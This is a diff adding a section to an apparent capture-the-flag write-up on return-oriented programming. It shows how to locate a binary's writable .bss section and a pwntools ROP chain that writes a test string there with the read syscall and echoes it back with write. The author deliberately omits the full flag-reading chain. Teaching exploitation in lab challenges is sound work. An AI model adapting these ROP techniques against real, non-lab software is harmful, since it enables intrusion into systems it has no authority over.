@@ -471,3 +471,93 @@ AAAAAAAAAA[*] Got EOF while reading in interactive
 With this, you’ve successfully learned how to invoke **Linux syscalls using ROP**
 
 All the best for the rest of the challenge — and happy pwning!
+
+
+## Level 5.0
+
+Craft a ROP chain to obtain the flag, now with no stack leak!
+
+When you run the binary, you’ll notice something different this time:
+
+- There is **no helpful `[LEAK]` line** printing the stack address.
+- ASLR is **still enabled**, meaning the stack address is **randomized** every time.    
+- You're still allowed to overflow the buffer and control the return address — but you now **cannot reference data on the stack**, since you don't know where it lives.
+
+
+So... how do we ROP now?
+
+There are locations in binary where we can write our string. Ladies and gentleman welcome to the show!
+
+#### `.bss` – Our Writable Playground
+
+
+The **.bss section** (Block Started by Symbol) in an object file, executable, or assembly code holds statically allocated variables that are declared but not explicitly initialized by the programmer. These are typically global and static variables set to zero or left uninitialized. The `.bss` segment allows the executable file to record only the size of the needed memory, not its content, so the file remains small. When the program loads, the operating system allocates and zeroes this memory automatically.
+
+The `.bss` section in a binary is a **writable**, **predictable**, and **safe** place to store our data — like the string `"/flag\x00"`, file contents, or any temporary ROP scratchpad.
+
+Since its address is fixed (non-randomized), we can **direct our ROP chain to write here**, reuse it across multiple syscalls, and avoid referencing the randomized stack altogether.
+
+Before we start writing our payload to `.bss`, let’s first **check its location and permissions**.
+
+You can do this using `readelf`:
+
+```bash
+$ readelf -S --wide babyrop_level5.0 | grep .bss
+  [26] .bss              NOBITS          0000000000405090 004088 000058 00  WA  0   0 16
+```
+
+**WA**: Section flags:
+ - **W** = Writeable
+ - **A** = Allocatable (will be loaded into memory)
+
+**It is 88 bytes** in size.
+
+While `readelf` or `objdump` works great, if you're using **Pwntools**, there's an even cleaner way to get the address of the `.bss` section **programmatically**:
+
+
+```python
+from pwn import *
+
+exe = ELF('./babyrop_level5.0')
+bss_addr = exe.bss()
+log.info(f".bss section is at: {hex(bss_addr)}")
+# [*] .bss section is at: 0x405090
+```
+
+Now you can directly use `bss_addr` in your ROP chain to store data like:
+
+Now that we’ve got the address of `.bss`, it’s time to put it to good use. We’ll write the string `/flag` into `.bss`, then use the `open` syscall to open it, just like you would in a normal C program — except now, it’s pure ROP magic.
+
+I can demonstrate how to **write a value to a specific memory address** and then **read it back** using syscalls — a classic use of ROP chains.
+I won’t be showing you how to read `/flag` directly, as that would be cheating. 
+
+```python
+# Stage 1: read(0, .bss, 8) → write "some string" to memory
+payload += p64(pop_rax) + p64(0)         # syscall: read
+payload += p64(pop_rdi) + p64(0)         # stdin
+payload += p64(pop_rsi) + p64(bss_addr)  # destination: .bss section
+payload += p64(pop_rdx) + p64(20)        # number of bytes
+payload += p64(syscall)
+
+# Stage 2: write(1, .bss, 8) → read back the value we just wrote
+payload += p64(pop_rax) + p64(1)         # syscall: write
+payload += p64(pop_rdi) + p64(1)         # stdout
+payload += p64(pop_rsi) + p64(bss_addr)  # source: .bss section
+payload += p64(pop_rdx) + p64(20)        # number of bytes
+payload += p64(syscall)
+```
+
+This demonstrates how to write a string to memory and read it back using `read` and `write` syscalls — useful for testing ROP chains.
+
+```bash
+$ ./babyrop_level5.0.py
+#...
+
+Leaving!
+$ TEST STRING
+TEST STRING
+\x00\x00\x00\x00\xa0\xaa\xa1\xc8[*] Got EOF while reading in interactive
+$  
+```
+
+As you can see, I sent `"TEST STRING"` as input, and the ROP chain successfully echoed it back — demonstrating that we were able to write data to memory and read it back using syscalls.
